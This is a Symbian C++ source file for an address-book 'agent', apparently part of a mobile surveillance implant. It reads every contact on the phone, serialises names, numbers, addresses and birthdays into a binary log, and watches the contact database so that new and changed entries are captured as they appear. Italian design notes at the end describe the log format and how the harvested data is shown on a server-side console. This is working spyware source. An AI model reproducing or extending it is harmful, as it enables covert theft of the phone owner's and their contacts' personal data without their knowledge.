/*
 ============================================================================
 Name		: AgentAddressbook.cpp
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CAgentAddressbook implementation
 ============================================================================
 */

#include "AgentAddressbook.h"
#include <HT\LogFile.h>
#include <CNTITEM.H>
#include <CNTFLDST.H>
#include <cntfield.h>

enum TContactEntry
	{
	EFirstName = 0x1,
	ELastName = 0x2,
	ECompanyName = 0x3,
	EBusinessFaxNumber = 0x4,
	EDepartment = 0x5,
	EEmail1Address = 0x6,
	EMobileTelephoneNumber = 0x7,
	EOfficeLocation = 0x8,
	EPagerNumber = 0x9,
	EBusinessTelephoneNumber = 0xA,
	EJobTitle = 0xB,
	EHomeTelephoneNumber = 0xC,
	EEmail2Address = 0xD,
	ESpouse = 0xE,
	EEmail3Address = 0xF,
	EHome2TelephoneNumber = 0x10,

	EHomeFaxNumber = 0x11,
	ECarTelephoneNumber = 0x12,
	EAssistantName = 0x13,
	EAssistantTelephoneNumber = 0x14,
	EChildren = 0x15,
	ECategories = 0x16,
	EWebPage = 0x17,
	EBusiness2TelephoneNumber = 0x18,
	ERadioTelephoneNumber = 0x19,
	EFileAs = 0x1A,
	EYomiCompanyName = 0x1B,
	EYomiFirstName = 0x1C,
	EYomiLastName = 0x1D,
	ETitle = 0x1E,
	EMiddleName = 0x1F,
	ESuffix = 0x20,

	EHomeAddressStreet = 0x21,
	EHomeAddressCity = 0x22,
	EHomeAddressState = 0x23,
	EHomeAddressPostalCode = 0x24,
	EHomeAddressCountry = 0x25,
	EOtherAddressStreet = 0x26,
	EOtherAddressCity = 0x27,
	EOtherAddressPostalCode = 0x28,
	EOtherAddressCountry = 0x29,
	EBusinessAddressStreet = 0x2A,
	EBusinessAddressCity = 0x2B,
	EBusinessAddressState = 0x2C,
	EBusinessAddressPostalCode = 0x2D,
	EBusinessAddressCountry = 0x2E,
	EOtherAddressState = 0x2F,
	EBody = 0x30,

	// NB: Birthday e Anniversary sono dei FILETIME convertiti in una stringa WCHAR!!!!!
	EBirthday = 0x31,
	EAnniversary = 0x32,

	EUnknown = 0xFF
	};

CAgentAddressbook::CAgentAddressbook() :
	CAbstractAgent(EAgent_Addressbook)
	{
	// No implementation required
	}

CAgentAddressbook::~CAgentAddressbook()
	{
	__FLOG(_L("Destructor"));
	delete iLongTask;
	delete iDbNotifier;
	delete iContDb;
	delete iFilter;
	delete iContacts;
	delete iMarkupFile;
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CAgentAddressbook* CAgentAddressbook::NewLC(const TDesC8& params)
	{
	CAgentAddressbook* self = new (ELeave) CAgentAddressbook();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentAddressbook* CAgentAddressbook::NewL(const TDesC8& params)
	{
	CAgentAddressbook* self = CAgentAddressbook::NewLC(params);
	CleanupStack::Pop(); // self;
	return self;
	}

void CAgentAddressbook::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	__FLOG_OPEN("HT", "Agent_AddressBook.txt");
	__FLOG(_L("-------------"));
	iLongTask = CLongTaskAO::NewL(*this);
	iMarkupFile = CLogFile::NewL(iFs);
	}

void CAgentAddressbook::StartAgentCmdL()
	{
	__FLOG(_L("StartAgentCmdL()"));
	CreateLogL(LOGTYPE_ADDRESSBOOK);
	iStopLongTask = EFalse;

	delete iContDb;
	iContDb = NULL;
	iContDb = CContactDatabase::OpenL();
	
	// set the notifier: on contact events, HandleDatabaseEventL() is called
	delete iDbNotifier;
	iDbNotifier = NULL;
	iDbNotifier = CContactChangeNotifier::NewL(*iContDb, this);
				
	// if markup exists, set iTimestamp to that value
	// otherwise initialize iTimestamp to an initial value
	if(iMarkupFile->ExistsMarkupL(Type())){
		// retrieve iTimestamp
		RBuf8 timeBuffer(iMarkupFile->ReadMarkupL(Type()));
		timeBuffer.CleanupClosePushL();
		TInt64 timestamp;
		Mem::Copy(&timestamp,timeBuffer.Ptr(),sizeof(timestamp));
		CleanupStack::PopAndDestroy(&timeBuffer);		
		iTimestamp = timestamp;
		// we add just a microsecond to the timestamp so that we are sure not to take 
		// the contact of the timestamp saved into markup
		TTimeIntervalMicroSeconds oneMicroSecond = 1;
		iTimestamp += oneMicroSecond;
		
	} else {
		_LIT(KInitTime,"16010000:000000");
		iTimestamp.Set(KInitTime);
	}
	
	delete iFilter;
	iFilter = NULL;
	iFilter = CCntFilter::NewL();
	// Control the time range to filter on
	iFilter->SetFilterDateTime(iTimestamp);
	// Specify the type of contact item to include
	iFilter->SetContactFilterTypeALL(EFalse);
	iFilter->SetContactFilterTypeCard(ETrue);
	iFilter->SetContactFilterTypeGroup(EFalse);
	iFilter->SetContactFilterTypeOwnCard(EFalse);
	iFilter->SetContactFilterTypeTemplate(EFalse);
	
	// Remark!: modified contacts include new contacts....
	iFilter->SetIncludeModifiedContacts(ETrue);
	iContDb->FilterDatabaseL(*iFilter);
				
	delete iContacts;
	iContacts = NULL;
	iContacts = CContactIdArray::NewL(iFilter->iIds);
	
	iContactIndex = 0;
	
	iLongTask->NextRound();
	}

void CAgentAddressbook::StopAgentCmdL()
	{
	__FLOG(_L("StopAgentCmdL()"));
	delete iDbNotifier;
	iDbNotifier = NULL;
	delete iContDb;
	iContDb = NULL;
	delete iFilter;
	iFilter = NULL;
	delete iContacts;
	iContacts = NULL;
	iStopLongTask = ETrue;
	CloseLogL();
	}

TBool CAgentAddressbook::ContainsEmptyField(const CContactItemFieldSet& fields)
	{
	for (TInt i = 0; i < fields.Count(); i++)
		{
		const CContactItemField& itemField = fields[i];
		if (itemField.StorageType() == KStorageTypeText || itemField.StorageType() == KStorageTypeDateTime)
			{
			if (!itemField.Storage()->IsFull())
				return ETrue;
			}
		}
	return EFalse;
	}

HBufC* CAgentAddressbook::ReadFieldAsTextL(const CContactItemField& itemField)
	{
	if (itemField.Storage() == NULL || !itemField.Storage()->IsFull())
		return HBufC::NewL(0);

	switch (itemField.StorageType())
		{
		case KStorageTypeText:
			{
			CContactTextField* txtField = itemField.TextStorage();
			if (txtField == NULL)
				return HBufC::NewL(0);
			return txtField->Text().AllocL();
			}
		case KStorageTypeDateTime:
			{
			CContactDateField* dateField = itemField.DateTimeStorage();
			if (dateField == NULL)
				return HBufC::NewL(0);
			TTime time = dateField->Time();
			_LIT(KFORMAT_DATE, "%D%M%Y%/0%1%/1%2%/2%3%/3");
			TBuf<30> strTime;
			time.FormatL(strTime, KFORMAT_DATE);
			return strTime.AllocL();
			}
		default:
			return HBufC::NewL(0);
		}
	}

HBufC8* CAgentAddressbook::GetContactBufferL(const CContactItem& item)
	{
	CContactItemFieldSet& fields = item.CardFields();

	if (ContainsEmptyField(fields))
		{
		// This item has been removed but has not been deleted from the database yet
		__FLOG(_L("Skip Item: Contains Empty Fields"));
		return HBufC8::NewL(0);
		}

	if (item.IsDeleted())
		{
		__FLOG(_L("Skip Item: Deleted"));
		return HBufC8::NewL(0);
		}

	__FLOG(_L("DumpContactItem"));

	//create buffer	
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);

	for (TInt i = 0; i < fields.Count(); i++)
		{
		const CContactItemField& itemField = fields[i];
		if (itemField.IsDeleted())
			{
			__FLOG(_L("Skip IsDeleted"));
			continue;
			}
		RBuf buf(ReadFieldAsTextL(itemField));
		buf.CleanupClosePushL();
		if (buf.Length() > 0)
			{
			TContactEntry intType = (TContactEntry) GetTypeFromItemField(itemField);
			__FLOG_1(_L("Type: %d"), intType);
			__FLOG(buf);

			// 1st byte is the Type and next 3 bytes are the Length
			
			TUint32 typeAndLen = intType << 24;
			typeAndLen += buf.Size();
			TUint8* dataPtr = (TUint8 *) buf.Ptr();
			buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
			buffer->InsertL(buffer->Size(), dataPtr, buf.Size());
			
			}
		CleanupStack::PopAndDestroy(&buf);
		}

	// adds header data to buffer
	THeader header;
	header.dwSize += buffer->Size();
	header.lOid = item.Id();
	buffer->InsertL(0, &header, sizeof(header));

	HBufC8* result = buffer->Ptr(0).AllocL();
	CleanupStack::PopAndDestroy(buffer);
	return result;
	}

void CAgentAddressbook::DoOneRoundL()
	{
	// If the Agent has been stopped, don't proceed on the next round...
	if (iStopLongTask)
		return;
	if (iContactIndex >= iContacts->Count())
		{
			if(iContactIndex == 0)
				return;
			// write markup, we have finished the initial dump
			// and we write the date of the most recent changed/added item
			RBuf8 buf(GetTTimeBufferL(iTimestamp));
			buf.CleanupClosePushL();
			if (buf.Length() > 0)
				{
				iMarkupFile->WriteMarkupL(Type(),buf);
				}
			CleanupStack::PopAndDestroy(&buf);
				
			return;
		}
	TContactItemId itemId = (*iContacts)[iContactIndex];

	// Maybe the item has been removed in the meanwhile...
	if (itemId != KNullContactId)
		{
		__FLOG_1(_L("Contact:%d"), iContactIndex);
		CContactItem* item = iContDb->ReadContactLC(itemId);
		RBuf8 buf(GetContactBufferL(*item));
		buf.CleanupClosePushL();
		if (buf.Length() > 0)
			{
			// dump the buffer to the file log. 
			AppendLogL(buf);
			// check the date against the last saved one and update if necessary
			TTime time = item->LastModified();
			if (iTimestamp < time){
				iTimestamp = time;
			} 
			}
		CleanupStack::PopAndDestroy(&buf);
		CleanupStack::PopAndDestroy(item);
		}
	iContactIndex++;

	iLongTask->NextRound();
	}

TInt CAgentAddressbook::GetTypeFromItemField(const CContactItemField& aField)
	{
	const CContentType& contType = aField.ContentType();

#ifdef _LOGGING
	__FLOG(_L("ContentType:"));
	for (TInt i = 0; i < contType.FieldTypeCount(); i++)
		{
		TFieldType type = contType.FieldType(i);
		TBuf<20> buf;
		buf.AppendNum(type.iUid, EHex);
		__FLOG(buf);
		}
#endif

	if (contType.ContainsFieldType(KUidContactFieldGivenName))
		return EFirstName;

	if (contType.ContainsFieldType(KUidContactFieldFamilyName))
		return ELastName;

	if (contType.ContainsFieldType(KUidContactFieldCompanyName))
		return ECompanyName;

	if (contType.ContainsFieldType(KUidContactFieldJobTitle))
		return EJobTitle;

	if (contType.ContainsFieldType(KUidContactFieldVCardMapCELL))
		return EMobileTelephoneNumber;

	if (contType.ContainsFieldType(KUidContactFieldVCardMapVOICE))
		{
		if (contType.ContainsFieldType(KUidContactFieldVCardMapWORK))
			return EBusinessTelephoneNumber;
		return EHomeTelephoneNumber;
		}

	if (contType.ContainsFieldType(KUidContactFieldVCardMapFAX))
		{
		if (contType.ContainsFieldType(KUidContactFieldVCardMapWORK))
			return EBusinessFaxNumber;
		return EHomeFaxNumber;
		}

	if (contType.ContainsFieldType(KUidContactFieldPostcode))
		{
		if (contType.ContainsFieldType(KUidContactFieldVCardMapWORK))
			return EBusinessAddressPostalCode;
		if (contType.ContainsFieldType(KUidContactFieldVCardMapHOME))
			return EHomeAddressPostalCode;
		return EOtherAddressPostalCode;
		}

	if (contType.ContainsFieldType(KUidContactFieldAddress))
		{
		if (contType.ContainsFieldType(KUidContactFieldVCardMapWORK))
			return EBusinessAddressPostalCode;
		if (contType.ContainsFieldType(KUidContactFieldVCardMapHOME))
			return EHomeAddressPostalCode;
		return EOtherAddressStreet;
		}

	if (contType.ContainsFieldType(KUidContactFieldLocality))
		{
		if (contType.ContainsFieldType(KUidContactFieldVCardMapWORK))
			return EBusinessAddressCity;
		if (contType.ContainsFieldType(KUidContactFieldVCardMapHOME))
			return EHomeAddressCity;
		return EOtherAddressCity;
		}

	if (contType.ContainsFieldType(KUidContactFieldRegion))
		{
		if (contType.ContainsFieldType(KUidContactFieldVCardMapWORK))
			return EBusinessAddressState;
		if (contType.ContainsFieldType(KUidContactFieldVCardMapHOME))
			return EHomeAddressState;
		return EOtherAddressState;
		}

	if (contType.ContainsFieldType(KUidContactFieldCountry))
		{
		if (contType.ContainsFieldType(KUidContactFieldVCardMapWORK))
			return EBusinessAddressCountry;
		if (contType.ContainsFieldType(KUidContactFieldVCardMapHOME))
			return EHomeAddressCountry;
		return EOtherAddressCountry;
		}

	return EUnknown;
	}

/*
 * This is called when an event on contact db is detected 
 */
void CAgentAddressbook::HandleDatabaseEventL(TContactDbObserverEvent aEvent)
{
	switch (aEvent.iType)
	{
		// Look for other events into TContactDbObserverEventType def 
		case EContactDbObserverEventContactChanged:
		case EContactDbObserverEventContactAdded:
			{
				// retrieve contact and write to log
				CContactItem* item = iContDb->ReadContactLC(aEvent.iContactId);
				RBuf8 buf(GetContactBufferL(*item));
				buf.CleanupClosePushL();
				if (buf.Length() > 0)
				{
					// append the buffer
					CLogFile* logFile = CLogFile::NewLC(iFs);
					logFile->CreateLogL(LOGTYPE_ADDRESSBOOK);
					logFile->AppendLogL(buf);
					logFile->CloseLogL();
					CleanupStack::PopAndDestroy(logFile);
					if(iMarkupFile->ExistsMarkupL(Type())){
						// if a markup exists, a dump has been performed and this 
						// is the most recent change
						RBuf8 buffer(GetTTimeBufferL(item->LastModified()));
						buffer.CleanupClosePushL();
						if (buffer.Length() > 0)
						{
							iMarkupFile->WriteMarkupL(Type(),buffer);
						}
						CleanupStack::PopAndDestroy(&buffer);
					}					
				}
				CleanupStack::PopAndDestroy(&buf);
				CleanupStack::PopAndDestroy(item);
			}
			break;
		default:
			{
				// event ignored
			}
			break;
	}
}


HBufC8* CAgentAddressbook::GetTTimeBufferL(const TTime aTime)
{
	TInt64 timestamp = aTime.Int64();
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	
	TUint32 len = sizeof(len) + sizeof(timestamp);
	buffer->InsertL(buffer->Size(), &len, sizeof(len));
	buffer->InsertL(buffer->Size(), &timestamp, sizeof(timestamp));

	HBufC8* result = buffer->Ptr(0).AllocL();
	CleanupStack::PopAndDestroy(buffer);
	return result;
}


/*
 AddressBook Agent

 L'agente AddressBook si occupa della cattura della rubrica che include i numeri di telefono i nomi e tutte le relative informazioni di ogni contatto che e' presente all'interno del telefono (sia esso un contatto registrato all'interno della SIM o nella memoria del telefono). L'agente non prende alcun parametro di configurazione, quindi puo' essere soltanto abilitato o disabilitato.
 Data Structs

 I log di tipo Addressbook sono una sequenza di strutture dinamiche, ognuna composta da una parte fissa e una variabile.
 Parte fissa

 Header
 header di lunghezza fissa.

 typedef struct _Header{
 DWORD           dwSize;
 DWORD           dwVersion;
 LONG            lOid;
 } HeaderStruct, *pHeaderStruct;

 * DWORD dwSize, dimensione totale della struttura
 * DWORD dwVersion, versione di questo log
 * LONG lOid, un LONG che rappresenta l'ID del contatto nel db del cellulare. 

 Parte Variabile

 La parte variabile e' composta da 0 a n blocchi, costituiti da un prefisso (DWORD) e da una stringa (WCHAR) senza terminatore.
 Il prefisso e' una DWORD composta da 1 byte di tipo e 3 byte che indicano la lunghezza della stringa che segue.
 I due byte che indicano il tipo possono assumere i valori di questa enum:

 enum e_contactEntry{
 FirstName = 0x1,        LastName = 0x2,                 CompanyName     = 0x3,          BusinessFaxNumber = 0x4,
 Department = 0x5,       Email1Address = 0x6,            MobileTelephoneNumber = 0x7,    OfficeLocation = 0x8, 
 PagerNumber = 0x9,      BusinessTelephoneNumber = 0xA,  JobTitle = 0xB,                 HomeTelephoneNumber = 0xC,
 Email2Address = 0xD,    Spouse = 0xE,                   Email3Address  = 0xF,           Home2TelephoneNumber = 0x10,

 HomeFaxNumber = 0x11,   CarTelephoneNumber = 0x12,      AssistantName = 0x13,           AssistantTelephoneNumber = 0x14,
 Children = 0x15,        Categories = 0x16,              WebPage = 0x17,                 Business2TelephoneNumber = 0x18,
 RadioTelephoneNumber = 0x19,FileAs = 0x1A,              YomiCompanyName = 0x1B,         YomiFirstName = 0x1C,
 YomiLastName = 0x1D,            Title = 0x1E,           MiddleName = 0x1F,              Suffix = 0x20,

 HomeAddressStreet = 0x21,       HomeAddressCity = 0x22,                 HomeAddressState = 0x23,        HomeAddressPostalCode = 0x24,   
 HomeAddressCountry = 0x25,      OtherAddressStreet = 0x26,              OtherAddressCity = 0x27,        OtherAddressPostalCode = 0x28,
 OtherAddressCountry = 0x29,     BusinessAddressStreet = 0x2A,           BusinessAddressCity = 0x2B,     BusinessAddressState = 0x2C, 
 BusinessAddressPostalCode = 0x2D, BusinessAddressCountry = 0x2E, OtherAddressState = 0x2F, Body = 0x30,

 // NB: Birthday e Anniversary sono dei FILETIME convertiti in una stringa WCHAR!!!!!
 Birthday = 0x31,        Anniversary = 0x32
 };

 Come annotato nell'enum Birthday e Anniversary, originariamente dei FILETIME, sono trasformati in una stringa WCHAR NON-Null terminata di questo tipo: gg/mm/aaaa. Se una qualche piattaforma utilizza, per la descrizione del contatto, altri campi che non possono essere riportati a quelli gia' esistenti e' possibile aggiungere nuovi tipi nell'enum.
 Le informazioni piu' importanti, che verranno visualizzate dalla console in singoli campi, sono FirstName, LastName (o FileAs al posto di entrambi) e un numero di telefono. Poiche' i numeri di telefono possono essere piu' di uno, si e' scelto di considerare il MobileTelephoneNumber il piu' importante mentre gli altri venogono visualizzati nelle informazioni generali. Se il numero di cellulare non dovessere essere presente si seguira' lato server la seguente scaletta:

 MobileTelephoneNumber 
 BusinessTelephoneNumber
 HomeTelephoneNumber
 HomeFaxNumber
 CarTelephoneNumber     
 RadioTelephoneNumber

 Log Format

 I log prodotti dall'agente AddressBook vengono inseriti tutti in un unico file alla prima esecuzione dell'agente. I successivi contatti che vengono inseriti nel cellulare occuperanno ognuno un file di log. 
 */
